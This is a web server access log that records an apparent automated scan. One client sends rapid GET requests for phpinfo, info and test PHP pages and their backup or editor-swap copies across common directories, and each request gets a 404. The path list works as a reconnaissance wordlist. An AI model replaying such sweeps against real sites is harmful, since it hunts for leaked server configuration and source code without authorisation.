043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:05;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:06;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:07;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:08;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:09;;/site/info.php;GET;404
